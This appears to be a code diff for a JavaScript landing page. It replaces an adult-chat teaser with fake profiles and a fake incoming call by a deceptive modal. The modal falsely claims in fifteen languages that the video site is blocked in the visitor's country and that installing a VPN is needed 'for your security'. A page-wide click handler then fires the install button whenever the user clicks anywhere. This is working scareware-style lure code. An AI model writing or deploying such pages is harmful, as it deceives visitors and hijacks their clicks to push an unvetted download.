@@ -1,505 +1,171 @@
-(function () {
-  const supportedLocales = [
-    "en",
-    "fr",
-    "pt-PT",
-    "pt-BR",
-    "es",
-    "es-419",
-    "da",
-    "ja",
-    "fil",
-    "de",
-    "nb",
-    "sv",
-    "it",
-    "nl",
-    "ro"
+
+document.addEventListener("DOMContentLoaded", function () {
+    const bg = document.querySelector(".screen-bg");
+    const modal = document.querySelector(".fake-modal");
+  
+
+
+    let totalSeconds = 60;
+    let timerStarted = false;
+    let switched = false;
+    let intervalId = null;
+
+const translations = {
+  
+  en: {
+  fake_modal__top_note_key: "This video site is blocked<br>in your country",
+  modal_title_key: "Download VPN to watch",
+  modal_text_key: "To watch videos, you need to <b>install a VPN</b> for your security.",
+  scan_now_option: "Install VPN",
+},
+  
+  fr: {
+  fake_modal__top_note_key: "Ce site vidéo est bloqué<br>dans votre pays",
+  modal_title_key: "Téléchargez un VPN pour regarder",
+  modal_text_key: "Pour regarder des vidéos, vous devez <b>installer un VPN</b> pour votre sécurité.",
+  scan_now_option: "Installer VPN",
+},
+
+"pt-PT": {
+  fake_modal__top_note_key: "Este site de vídeo está bloqueado<br>no seu país",
+  modal_title_key: "Transfira uma VPN para assistir",
+  modal_text_key: "Para assistir a vídeos, precisa de <b>instalar uma VPN</b> para sua segurança.",
+  scan_now_option: "Instalar VPN",
+},
+
+"pt-BR": {
+  fake_modal__top_note_key: "Este site de vídeos está bloqueado<br>no seu país",
+  modal_title_key: "Baixe uma VPN para assistir",
+  modal_text_key: "Para assistir vídeos, você precisa <b>instalar uma VPN</b> para sua segurança.",
+  scan_now_option: "Instalar VPN",
+},
+
+es: {
+  fake_modal__top_note_key: "Este sitio de videos está bloqueado<br>en tu país",
+  modal_title_key: "Descarga una VPN para ver",
+  modal_text_key: "Para ver videos, necesitas <b>instalar una VPN</b> para tu seguridad.",
+  scan_now_option: "Instalar VPN",
+},
+
+"es-419": {
+  fake_modal__top_note_key: "Este sitio de videos está bloqueado<br>en tu país",
+  modal_title_key: "Descarga una VPN para ver",
+  modal_text_key: "Para ver videos, necesitas <b>instalar una VPN</b> para tu seguridad.",
+  scan_now_option: "Instalar VPN",
+},
+
+da: {
+  fake_modal__top_note_key: "Dette videosite er blokeret<br>i dit land",
+  modal_title_key: "Download VPN for at se",
+  modal_text_key: "For at se videoer skal du <b>installere en VPN</b> for din sikkerhed.",
+  scan_now_option: "Installer VPN",
+},
+
+ja: {
+  fake_modal__top_note_key: "この動画サイトは<br>お住まいの国ではブロックされています",
+  modal_title_key: "視聴するにはVPNをダウンロード",
+  modal_text_key: "動画を視聴するには、安全のために<b>VPNをインストール</b>する必要があります。",
+  scan_now_option: "VPNをインストール",
+},
+
+fil: {
+  fake_modal__top_note_key: "Naka-block ang video site na ito<br>sa iyong bansa",
+  modal_title_key: "Mag-download ng VPN para manood",
+  modal_text_key: "Para makapanood ng mga video, kailangan mong <b>mag-install ng VPN</b> para sa iyong seguridad.",
+  scan_now_option: "I-install ang VPN",
+},
+
+de: {
+  fake_modal__top_note_key: "Diese Video-Website ist<br>in Ihrem Land blockiert",
+  modal_title_key: "VPN herunterladen zum Ansehen",
+  modal_text_key: "Um Videos anzusehen, müssen Sie <b>ein VPN installieren</b> zu Ihrer Sicherheit.",
+  scan_now_option: "VPN installieren",
+},
+
+nb: {
+  fake_modal__top_note_key: "Denne videosiden er blokkert<br>i ditt land",
+  modal_title_key: "Last ned VPN for å se",
+  modal_text_key: "For å se videoer må du <b>installere en VPN</b> for din sikkerhet.",
+  scan_now_option: "Installer VPN",
+},
+
+sv: {
+  fake_modal__top_note_key: "Den här videosajten är blockerad<br>i ditt land",
+  modal_title_key: "Ladda ner VPN för att titta",
+  modal_text_key: "För att titta på videor måste du <b>installera ett VPN</b> för din säkerhet.",
+  scan_now_option: "Installera VPN",
+},
+
+it: {
+  fake_modal__top_note_key: "Questo sito video è bloccato<br>nel tuo paese",
+  modal_title_key: "Scarica una VPN per guardare",
+  modal_text_key: "Per guardare i video devi <b>installare una VPN</b> per la tua sicurezza.",
+  scan_now_option: "Installa VPN",
+},
+
+nl: {
+  fake_modal__top_note_key: "Deze videosite is geblokkeerd<br>in jouw land",
+  modal_title_key: "Download VPN om te kijken",
+  modal_text_key: "Om video's te bekijken moet je <b>een VPN installeren</b> voor je veiligheid.",
+  scan_now_option: "VPN installeren",
+},
+
+ro: {
+  fake_modal__top_note_key: "Acest site video este blocat<br>în țara ta",
+  modal_title_key: "Descarcă un VPN pentru a viziona",
+  modal_text_key: "Pentru a viziona videoclipuri, trebuie să <b>instalezi un VPN</b> pentru siguranța ta.",
+  scan_now_option: "Instalează VPN",
+},
+};
+
+  const definedLanguages = [
+    "en", "fr", "pt-PT", "pt-BR", "es", "es-419",
+    "da", "ja", "fil", "de", "nb", "sv", "it", "nl", "ro"
   ];
 
-  const latinAmericaRegions = new Set([
-    "AR",
-    "BO",
-    "BR",
-    "BZ",
-    "CL",
-    "CO",
-    "CR",
-    "CU",
-    "DO",
-    "EC",
-    "GT",
-    "HN",
-    "MX",
-    "NI",
-    "PA",
-    "PE",
-    "PR",
-    "PY",
-    "SV",
-    "UY",
-    "VE"
-  ]);
+  const currentLocale = (navigator && navigator.language) || "en";
 
-  const translations = {
-    en: {
-      title: "Real women. Real attention. Right now.",
-      subtitle: "Select your favorite:",
-      live: "Live",
-      select: "Select",
-      cta: "Match With Someone Else",
-      installAria: "Install the app",
-      installTitle: "Install App",
-      installSubtitle: "To chat with girls 18+, download the app",
-      incomingCallAria: "Incoming call",
-      callerTitle: "Kristi 🍑, 32",
-      callerStatus: "Calling you...",
-      declineCallAria: "Decline call",
-      acceptCallAria: "Accept call"
-    },
-    fr: {
-      title: "De vraies femmes. Une vraie attention. Maintenant.",
-      subtitle: "Choisissez votre favorite :",
-      live: "En direct",
-      select: "Choisir",
-      cta: "Rencontrer quelqu'un d'autre",
-      installAria: "Installer l'app",
-      installTitle: "Installer l'app",
-      installSubtitle: "Pour discuter avec des filles 18+, telechargez l'app",
-      incomingCallAria: "Appel entrant",
-      callerTitle: "Kristi 🍑, 32",
-      callerStatus: "Vous appelle...",
-      declineCallAria: "Refuser l'appel",
-      acceptCallAria: "Accepter l'appel"
-    },
-    "pt-PT": {
-      title: "Mulheres reais. Atenção real. Agora mesmo.",
-      subtitle: "Escolhe a tua favorita:",
-      live: "Ao vivo",
-      select: "Escolher",
-      cta: "Combinar com outra pessoa",
-      installAria: "Instalar a app",
-      installTitle: "Instalar app",
-      installSubtitle: "Para conversar com mulheres 18+, transfere a app",
-      incomingCallAria: "Chamada recebida",
-      callerTitle: "Kristi 🍑, 32",
-      callerStatus: "A ligar-te...",
-      declineCallAria: "Recusar chamada",
-      acceptCallAria: "Atender chamada"
-    },
-    "pt-BR": {
-      title: "Mulheres reais. Atenção real. Agora mesmo.",
-      subtitle: "Escolha sua favorita:",
-      live: "Ao vivo",
-      select: "Escolher",
-      cta: "Dar match com outra pessoa",
-      installAria: "Instalar o app",
-      installTitle: "Instalar app",
-      installSubtitle: "Para conversar com mulheres 18+, baixe o app",
-      incomingCallAria: "Chamada recebida",
-      callerTitle: "Kristi 🍑, 32",
-      callerStatus: "Ligando para voce...",
-      declineCallAria: "Recusar chamada",
-      acceptCallAria: "Atender chamada"
-    },
-    es: {
-      title: "Mujeres reales. Atención real. Ahora mismo.",
-      subtitle: "Elige tu favorita:",
-      live: "En vivo",
-      select: "Elegir",
-      cta: "Conectar con otra persona",
-      installAria: "Instalar la app",
-      installTitle: "Instalar app",
-      installSubtitle: "Para chatear con chicas 18+, descarga la app",
-      incomingCallAria: "Llamada entrante",
-      callerTitle: "Kristi 🍑, 32",
-      callerStatus: "Te esta llamando...",
-      declineCallAria: "Rechazar llamada",
-      acceptCallAria: "Aceptar llamada"
-    },
-    "es-419": {
-      title: "Mujeres reales. Atención real. Ahora mismo.",
-      subtitle: "Elige tu favorita:",
-      live: "En vivo",
-      select: "Elegir",
-      cta: "Hacer match con otra persona",
-      installAria: "Instalar la app",
-      installTitle: "Instalar app",
-      installSubtitle: "Para chatear con chicas 18+, descarga la app",
-      incomingCallAria: "Llamada entrante",
-      callerTitle: "Kristi 🍑, 32",
-      callerStatus: "Te esta llamando...",
-      declineCallAria: "Rechazar llamada",
-      acceptCallAria: "Aceptar llamada"
-    },
-    da: {
-      title: "Ægte kvinder. Ægte opmærksomhed. Lige nu.",
-      subtitle: "Vælg din favorit:",
-      live: "Live",
-      select: "Vælg",
-      cta: "Match med en anden",
-      installAria: "Installer appen",
-      installTitle: "Installer app",
-      installSubtitle: "Chat med piger 18+, download appen",
-      incomingCallAria: "Indkommende opkald",
-      callerTitle: "Kristi 🍑, 32",
-      callerStatus: "Ringer til dig...",
-      declineCallAria: "Afvis opkald",
-      acceptCallAria: "Besvar opkald"
-    },
-    ja: {
-      title: "リアルな女性。リアルな注目。今すぐ。",
-      subtitle: "お気に入りを選択:",
-      live: "ライブ",
-      select: "選択",
-      cta: "別の相手とマッチ",
-      installAria: "アプリをインストール",
-      installTitle: "アプリをインストール",
-      installSubtitle: "18+の女性とチャットするにはアプリをダウンロード",
-      incomingCallAria: "着信",
-      callerTitle: "Kristi 🍑, 32",
-      callerStatus: "通話中...",
-      declineCallAria: "通話を拒否",
-      acceptCallAria: "通話に応答"
-    },
-    fil: {
-      title: "Tunay na babae. Tunay na atensyon. Ngayon na.",
-      subtitle: "Piliin ang paborito mo:",
-      live: "Live",
-      select: "Piliin",
-      cta: "Makipag-match sa iba",
-      installAria: "I-install ang app",
-      installTitle: "Install App",
-      installSubtitle: "Para makipag-chat sa girls 18+, i-download ang app",
-      incomingCallAria: "Papasok na tawag",
-      callerTitle: "Kristi 🍑, 32",
-      callerStatus: "Tumatawag sa iyo...",
-      declineCallAria: "Tanggihan ang tawag",
-      acceptCallAria: "Sagutin ang tawag"
-    },
-    de: {
-      title: "Echte Frauen. Echte Aufmerksamkeit. Genau jetzt.",
-      subtitle: "Wähle deinen Favoriten:",
-      live: "Live",
-      select: "Auswählen",
-      cta: "Mit jemand anderem matchen",
-      installAria: "App installieren",
-      installTitle: "App installieren",
-      installSubtitle: "Um mit Frauen 18+ zu chatten, lade die App herunter",
-      incomingCallAria: "Eingehender Anruf",
-      callerTitle: "Kristi 🍑, 32",
-      callerStatus: "Ruft dich an...",
-      declineCallAria: "Anruf ablehnen",
-      acceptCallAria: "Anruf annehmen"
-    },
-    nb: {
-      title: "Ekte kvinner. Ekte oppmerksomhet. Akkurat nå.",
-      subtitle: "Velg din favoritt:",
-      live: "Direkte",
-      select: "Velg",
-      cta: "Match med noen andre",
-      installAria: "Installer appen",
-      installTitle: "Installer app",
-      installSubtitle: "For å chatte med jenter 18+, last ned appen",
-      incomingCallAria: "Innkommende anrop",
-      callerTitle: "Kristi 🍑, 32",
-      callerStatus: "Ringer deg...",
-      declineCallAria: "Avvis anrop",
-      acceptCallAria: "Svar på anrop"
-    },
-    sv: {
-      title: "Riktiga kvinnor. Riktig uppmärksamhet. Just nu.",
-      subtitle: "Välj din favorit:",
-      live: "Live",
-      select: "Välj",
-      cta: "Matcha med någon annan",
-      installAria: "Installera appen",
-      installTitle: "Installera app",
-      installSubtitle: "For att chatta med tjejer 18+, ladda ner appen",
-      incomingCallAria: "Inkommande samtal",
-      callerTitle: "Kristi 🍑, 32",
-      callerStatus: "Ringer dig...",
-      declineCallAria: "Avvisa samtal",
-      acceptCallAria: "Svara på samtal"
-    },
-    it: {
-      title: "Donne reali. Attenzione reale. Proprio ora.",
-      subtitle: "Scegli la tua preferita:",
-      live: "Live",
-      select: "Scegli",
-      cta: "Abbina con qualcun altro",
-      installAria: "Installa l'app",
-      installTitle: "Installa app",
-      installSubtitle: "Per chattare con ragazze 18+, scarica l'app",
-      incomingCallAria: "Chiamata in arrivo",
-      callerTitle: "Kristi 🍑, 32",
-      callerStatus: "Ti sta chiamando...",
-      declineCallAria: "Rifiuta chiamata",
-      acceptCallAria: "Accetta chiamata"
-    },
-    nl: {
-      title: "Echte vrouwen. Echte aandacht. Op dit moment.",
-      subtitle: "Kies je favoriet:",
-      live: "Live",
-      select: "Kies",
-      cta: "Match met iemand anders",
-      installAria: "Installeer de app",
-      installTitle: "App installeren",
-      installSubtitle: "Om te chatten met vrouwen 18+, download de app",
-      incomingCallAria: "Inkomende oproep",
-      callerTitle: "Kristi 🍑, 32",
-      callerStatus: "Belt jou...",
-      declineCallAria: "Oproep weigeren",
-      acceptCallAria: "Oproep aannemen"
-    },
-    ro: {
-      title: "Femei reale. Atenție reală. Chiar acum.",
-      subtitle: "Alege-ți favorita:",
-      live: "Live",
-      select: "Alege",
-      cta: "Potrivește-te cu altcineva",
-      installAria: "Instalează aplicația",
-      installTitle: "Instalează aplicația",
-      installSubtitle: "Pentru chat cu femei 18+, descarcă aplicația",
-      incomingCallAria: "Apel primit",
-      callerTitle: "Kristi 🍑, 32",
-      callerStatus: "Te sună...",
-      declineCallAria: "Respinge apelul",
-      acceptCallAria: "Acceptă apelul"
-    }
-  };
+  const getLocale = () => {
+    if (translations[currentLocale]) return currentLocale;
 
-  const defaultProfiles = [
-    { name: "Melina" },
-    { name: "KristiM" },
-    { name: "KissGirl" },
-    { name: "NakedKate" }
-  ];
-
-  const callConfig = {
-    delay: 1000,
-    videoStartTime: 0
-  };
-  let callTimer = null;
-  let callVideoPlay = null;
-  let callVideoFallback = null;
-
-  function normalizeLocale(locale) {
-    if (!locale) {
-      return "en";
-    }
-
-    const cleanLocale = locale.replace("_", "-");
-    const parts = cleanLocale.split("-");
-    const language = (parts[0] || "").toLowerCase();
-    const region = (parts[1] || "").toUpperCase();
-
-    if (language === "pt") {
-      return region === "BR" ? "pt-BR" : "pt-PT";
-    }
-
-    if (language === "es") {
-      return region === "419" || latinAmericaRegions.has(region) ? "es-419" : "es";
-    }
-
-    if (language === "no") {
-      return "nb";
-    }
-
-    if (language === "tl") {
-      return "fil";
-    }
-
-    return supportedLocales.includes(language) ? language : "en";
-  }
-
-  function getLocale() {
-    const params = new URLSearchParams(window.location.search);
-    const requestedLocale = params.get("lang");
-
-    if (requestedLocale) {
-      return normalizeLocale(requestedLocale);
-    }
-
-    const browserLocales = navigator.languages && navigator.languages.length
-      ? navigator.languages
-      : [navigator.language];
-
-    for (const locale of browserLocales) {
-      const normalized = normalizeLocale(locale);
-
-      if (translations[normalized]) {
-        return normalized;
-      }
-    }
+    const shortLocale = currentLocale.slice(0, 2);
+    if (translations[shortLocale]) return shortLocale;
 
     return "en";
-  }
+  };
 
-  function localizePage() {
-    const locale = getLocale();
-    const copy = translations[locale] || translations.en;
+  const locale = getLocale();
+  const t = translations[locale] || translations.en;
 
-    document.documentElement.lang = locale;
-    document.title = copy.title;
+  document.documentElement.lang = locale;
+document.getElementById("fake_modal__top_note_key").innerHTML = t.fake_modal__top_note_key;
+document.getElementById("modal_title_key").textContent = t.modal_title_key;
+document.getElementById("modal_text_key").innerHTML = t.modal_text_key;
+document.getElementById("scan_now_option").textContent = t.scan_now_option;
 
-    document.querySelectorAll("[data-i18n]").forEach((element) => {
-      const key = element.dataset.i18n;
+document.addEventListener("click", function (e) {
+    const installBtn = document.getElementById("goStep1");
+    if (!installBtn) return;
+    installBtn.click();
+});
 
-      if (copy[key]) {
-        element.textContent = copy[key];
-      }
-    });
 
-    document.querySelectorAll("[data-i18n-aria]").forEach((element) => {
-      const key = element.dataset.i18nAria;
 
-      if (copy[key]) {
-        element.setAttribute("aria-label", copy[key]);
-      }
-    });
 
-    document.querySelectorAll(".profile-card").forEach((card, index) => {
-      const profile = defaultProfiles[index] || defaultProfiles[defaultProfiles.length - 1];
-
-      const badge = card.querySelector(".live-badge");
-      const name = card.querySelector(".profile-name");
-      const image = card.querySelector(".profile-image");
-
-      card.setAttribute("aria-label", `${copy.select} ${profile.name}`);
-
-      if (badge) {
-        badge.textContent = copy.live;
-      }
-
-      if (name) {
-        name.textContent = profile.name;
-      }
-
-      if (image) {
-        image.alt = profile.name;
-      }
-    });
-  }
-
-  function showCallWindow() {
-    const overlay = document.querySelector("[data-call-overlay]");
-
-    if (!overlay || overlay.classList.contains("is-visible")) {
-      return;
+    if (bg) {
+        requestAnimationFrame(() => {
+            bg.classList.add("active");
+        });
     }
 
-    overlay.classList.add("is-visible");
-    overlay.setAttribute("aria-hidden", "false");
+  
+(function () {
+  const ua = navigator.userAgent;
+  const isIOS = /iPhone|iPad|iPod/i.test(ua);
+  const isChrome = /CriOS/i.test(ua);
 
-    window.requestAnimationFrame(() => {
-      window.requestAnimationFrame(() => {
-        if (callVideoPlay) {
-          callVideoPlay();
-        }
-
-        window.setTimeout(() => {
-          if (callVideoFallback) {
-            callVideoFallback();
-          }
-        }, 1200);
-      });
-    });
-  }
-
-  function initCallVideo() {
-    const video = document.querySelector(".call-video");
-
-    if (!video) {
-      return;
-    }
-
-    video.muted = true;
-    video.defaultMuted = true;
-    video.playsInline = true;
-    video.setAttribute("muted", "");
-    video.setAttribute("playsinline", "");
-    video.setAttribute("webkit-playsinline", "");
-
-    const tryPlay = () => {
-      const startTime = callConfig.videoStartTime;
-
-      if (startTime > 0 && Number.isFinite(video.duration)) {
-        video.currentTime = Math.min(startTime, Math.max(video.duration - 0.1, 0));
-      }
-
-      const promise = video.play();
-
-      if (promise && typeof promise.catch === "function") {
-        promise.catch(() => {});
-      }
-    };
-
-    const tryBlobFallback = () => {
-      if (video.dataset.blobFallback === "1" || video.readyState >= 2) {
-        return;
-      }
-
-      video.dataset.blobFallback = "1";
-
-      fetch("./video/reel-background.mp4")
-        .then((response) => {
-          if (!response.ok) {
-            throw new Error("Video fallback failed");
-          }
-
-          return response.blob();
-        })
-        .then((blob) => {
-          const url = URL.createObjectURL(blob);
-          video.src = url;
-          video.load();
-          tryPlay();
-        })
-        .catch(() => {});
-    };
-
-    callVideoPlay = tryPlay;
-    callVideoFallback = tryBlobFallback;
-
-    tryPlay();
-    window.setTimeout(tryBlobFallback, 1200);
-    video.addEventListener("error", tryBlobFallback, { once: true });
-    document.addEventListener("touchstart", tryPlay, { once: true, passive: true });
-    document.addEventListener("click", tryPlay, { once: true });
-  }
-
-  function scheduleCallWindow() {
-    const startTimer = () => {
-      if (callTimer) {
-        return;
-      }
-
-      callTimer = window.setTimeout(showCallWindow, callConfig.delay);
-    };
-
-    if (document.readyState === "complete") {
-      startTimer();
-      return;
-    }
-
-    window.addEventListener("load", startTimer, { once: true });
-    window.setTimeout(() => {
-      if (document.readyState === "complete") {
-        startTimer();
-      }
-    }, 0);
-  }
-
-  function init() {
-    localizePage();
-    initCallVideo();
-    scheduleCallWindow();
-  }
-
-  if (document.readyState === "loading") {
-    document.addEventListener("DOMContentLoaded", init, { once: true });
-  } else {
-    init();
+  if (isIOS && isChrome) {
+    document.body.classList.add('ios-chrome');
   }
 })();
+});
